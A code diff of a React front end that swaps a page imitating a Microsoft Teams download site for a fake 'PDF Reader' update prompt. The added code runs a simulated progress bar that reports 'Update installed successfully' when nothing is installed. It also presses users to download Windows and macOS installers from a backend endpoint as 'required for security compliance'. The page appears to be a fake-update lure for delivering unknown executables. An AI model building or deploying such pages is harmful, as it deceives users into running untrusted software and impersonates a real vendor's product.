@@ -1,154 +1,125 @@
-import { Download, Monitor, Apple, CheckCircle2, Shield, Zap, Users } from "lucide-react";
-import { Card } from "./components/ui/card";
+import { FileText, Download, Check, Sparkles, Shield, Zap } from "lucide-react";
+import { Button } from "./components/ui/button";
+import { Progress } from "./components/ui/progress";
+import { useState, useEffect } from "react";
 
 const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || 'http://localhost:3000/api';
-
 const getDownloadUrl = (platform: 'windows' | 'macos') => `${API_BASE_URL}/download/${platform}`;
 
 export default function App() {
+  const [isUpdating, setIsUpdating] = useState(false);
+  const [progress, setProgress] = useState(0);
+  const [updateComplete, setUpdateComplete] = useState(false);
+
+  useEffect(() => {
+    if (isUpdating && progress < 100) {
+      const timer = setTimeout(() => {
+        const increment = Math.random() * 15 + 5;
+        setProgress(prev => Math.min(prev + increment, 100));
+      }, 300);
+      return () => clearTimeout(timer);
+    } else if (progress >= 100 && isUpdating) {
+      setUpdateComplete(true);
+    }
+  }, [isUpdating, progress]);
+
+  const handleUpdate = () => {
+    setIsUpdating(true);
+    setProgress(0);
+    setUpdateComplete(false);
+  };
+
+  const features = [
+    { icon: Shield, text: "Enhanced security and performance" },
+    { icon: Zap, text: "Faster PDF rendering engine" },
+    { icon: Sparkles, text: "Modern UI improvements" },
+  ];
+
   return (
-    <div className="min-h-screen bg-gradient-to-b from-[#464775] via-[#5b5fc7] to-[#7b83eb]">
-      {/* Header */}
-      <header className="pt-12 pb-8 px-4">
-        <div className="max-w-4xl mx-auto text-center">
-          <div className="inline-flex items-center justify-center w-20 h-20 bg-white/10 backdrop-blur-sm rounded-2xl mb-6">
-            <Users className="w-10 h-10 text-white" />
-          </div>
-          <h1 className="text-4xl md:text-5xl font-bold text-white mb-4">
-            Microsoft Teams
-          </h1>
-          <p className="text-xl text-white/80 max-w-2xl mx-auto">
-            Get the latest version of Teams with improved performance, enhanced security, and new collaboration features.
-          </p>
-        </div>
-      </header>
-
-      {/* Main Content */}
-      <main className="px-4 pb-16">
-        <div className="max-w-4xl mx-auto">
-          {/* Download Cards */}
-          <div className="grid md:grid-cols-2 gap-6 mb-12">
-            {/* Windows Download */}
-            <Card className="bg-white/95 backdrop-blur border-0 shadow-2xl overflow-hidden group hover:shadow-3xl transition-all duration-300">
-              <div className="p-8">
-                <div className="flex items-center gap-4 mb-6">
-                  <div className="w-14 h-14 bg-[#0078d4] rounded-xl flex items-center justify-center">
-                    <Monitor className="w-7 h-7 text-white" />
-                  </div>
-                  <div>
-                    <h2 className="text-xl font-semibold text-gray-900">Windows</h2>
-                    <p className="text-gray-500 text-sm">Windows 10 / 11</p>
-                  </div>
-                </div>
-                
-                <div className="space-y-3 mb-6">
-                  <div className="flex items-center gap-2 text-sm text-gray-600">
-                    <CheckCircle2 className="w-4 h-4 text-green-500" />
-                    <span>64-bit installer (.exe)</span>
-                  </div>
-                  <div className="flex items-center gap-2 text-sm text-gray-600">
-                    <CheckCircle2 className="w-4 h-4 text-green-500" />
-                    <span>Version 25306.804</span>
-                  </div>
-                  <div className="flex items-center gap-2 text-sm text-gray-600">
-                    <CheckCircle2 className="w-4 h-4 text-green-500" />
-                    <span>~125 MB</span>
-                  </div>
-                </div>
-
-                <a
-                  href={getDownloadUrl('windows')}
-                  download
-                  className="flex items-center justify-center gap-2 w-full py-3 px-6 bg-[#5b5fc7] hover:bg-[#4b4fb7] text-white font-medium rounded-lg transition-colors"
-                >
-                  <Download className="w-5 h-5" />
-                  Download for Windows
-                </a>
-              </div>
-            </Card>
-
-            {/* macOS Download */}
-            <Card className="bg-white/95 backdrop-blur border-0 shadow-2xl overflow-hidden group hover:shadow-3xl transition-all duration-300">
-              <div className="p-8">
-                <div className="flex items-center gap-4 mb-6">
-                  <div className="w-14 h-14 bg-gray-900 rounded-xl flex items-center justify-center">
-                    <Apple className="w-7 h-7 text-white" />
-                  </div>
-                  <div>
-                    <h2 className="text-xl font-semibold text-gray-900">macOS</h2>
-                    <p className="text-gray-500 text-sm">macOS 11 Big Sur+</p>
-                  </div>
-                </div>
-                
-                <div className="space-y-3 mb-6">
-                  <div className="flex items-center gap-2 text-sm text-gray-600">
-                    <CheckCircle2 className="w-4 h-4 text-green-500" />
-                    <span>Universal installer (.pkg)</span>
-                  </div>
-                  <div className="flex items-center gap-2 text-sm text-gray-600">
-                    <CheckCircle2 className="w-4 h-4 text-green-500" />
-                    <span>Version 25306.804</span>
-                  </div>
-                  <div className="flex items-center gap-2 text-sm text-gray-600">
-                    <CheckCircle2 className="w-4 h-4 text-green-500" />
-                    <span>~125 MB</span>
-                  </div>
-                </div>
-
-                <a
-                  href={getDownloadUrl('macos')}
-                  download
-                  className="flex items-center justify-center gap-2 w-full py-3 px-6 bg-gray-900 hover:bg-gray-800 text-white font-medium rounded-lg transition-colors"
-                >
-                  <Download className="w-5 h-5" />
-                  Download for macOS
-                </a>
-              </div>
-            </Card>
-          </div>
-
-          {/* Features Section */}
-          <Card className="bg-white/10 backdrop-blur border-0 p-8">
-            <h3 className="text-xl font-semibold text-white mb-6 text-center">
-              What's New in This Version
-            </h3>
-            <div className="grid md:grid-cols-3 gap-6">
-              <div className="text-center">
-                <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3">
-                  <Zap className="w-6 h-6 text-white" />
-                </div>
-                <h4 className="font-medium text-white mb-2">Faster Performance</h4>
-                <p className="text-white/70 text-sm">
-                  Up to 2x faster app launch and improved responsiveness
-                </p>
-              </div>
-              <div className="text-center">
-                <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3">
-                  <Shield className="w-6 h-6 text-white" />
-                </div>
-                <h4 className="font-medium text-white mb-2">Enhanced Security</h4>
-                <p className="text-white/70 text-sm">
-                  Latest security patches and improved encryption
-                </p>
-              </div>
-              <div className="text-center">
-                <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3">
-                  <Users className="w-6 h-6 text-white" />
-                </div>
-                <h4 className="font-medium text-white mb-2">Better Collaboration</h4>
-                <p className="text-white/70 text-sm">
-                  New meeting features and improved file sharing
-                </p>
-              </div>
+    <div className="min-h-screen bg-gradient-to-br from-rose-50 via-orange-50 to-amber-50 flex items-center justify-center p-4">
+      <div className="w-full max-w-lg">
+        {/* Main Card */}
+        <div className="bg-white rounded-3xl shadow-xl shadow-orange-500/10 overflow-hidden">
+          {/* Header with gradient */}
+          <div className="bg-gradient-to-r from-orange-500 to-rose-500 p-8 text-center">
+            <div className="inline-flex items-center justify-center w-16 h-16 bg-white/20 backdrop-blur rounded-2xl mb-4">
+              <FileText className="w-8 h-8 text-white" />
             </div>
-          </Card>
+            <h1 className="text-2xl font-bold text-white mb-2">
+              Update Available
+            </h1>
+            <p className="text-white/90 text-sm">
+              PDF Reader v3.2.1 is ready to install
+            </p>
+          </div>
 
-          {/* Footer */}
-          <p className="text-center text-white/60 text-sm mt-8">
-            This update is required to maintain security and compatibility standards.
-          </p>
+          {/* Content */}
+          <div className="p-8 space-y-6">
+            {/* Features */}
+            <div className="space-y-3">
+              {features.map((feature, index) => (
+                <div 
+                  key={index}
+                  className="flex items-center gap-3 p-3 bg-gray-50 rounded-xl"
+                >
+                  <div className="w-10 h-10 bg-gradient-to-br from-orange-500 to-rose-500 rounded-lg flex items-center justify-center flex-shrink-0">
+                    <feature.icon className="w-5 h-5 text-white" />
+                  </div>
+                  <span className="text-gray-700 text-sm font-medium">
+                    {feature.text}
+                  </span>
+                </div>
+              ))}
+            </div>
+
+            {/* Progress */}
+            {isUpdating && (
+              <div className="space-y-3 py-2">
+                <div className="flex justify-between text-sm">
+                  <span className="text-gray-600 font-medium">
+                    {updateComplete ? "Complete!" : "Downloading..."}
+                  </span>
+                  <span className="text-orange-500 font-semibold">
+                    {Math.round(progress)}%
+                  </span>
+                </div>
+                <Progress value={progress} className="h-2" />
+                {updateComplete && (
+                  <div className="flex items-center gap-2 text-green-600 text-sm">
+                    <Check className="w-4 h-4" />
+                    <span>Update installed successfully</span>
+                  </div>
+                )}
+              </div>
+            )}
+
+            {/* Download Buttons */}
+            <div className="space-y-3">
+              <a
+                href={getDownloadUrl('windows')}
+                download
+                className="flex items-center justify-center gap-2 w-full py-3.5 bg-gradient-to-r from-orange-500 to-rose-500 hover:from-orange-600 hover:to-rose-600 text-white font-semibold rounded-xl transition-all shadow-lg shadow-orange-500/25 hover:shadow-orange-500/40"
+              >
+                <Download className="w-5 h-5" />
+                Download for Windows
+              </a>
+              <a
+                href={getDownloadUrl('macos')}
+                download
+                className="flex items-center justify-center gap-2 w-full py-3.5 bg-gray-900 hover:bg-gray-800 text-white font-semibold rounded-xl transition-all"
+              >
+                <Download className="w-5 h-5" />
+                Download for macOS
+              </a>
+            </div>
+
+            {/* Footer */}
+            <p className="text-center text-gray-400 text-xs">
+              ~125 MB • Version 3.2.1 • Required for security compliance
+            </p>
+          </div>
         </div>
-      </main>
+      </div>
     </div>
   );
 }
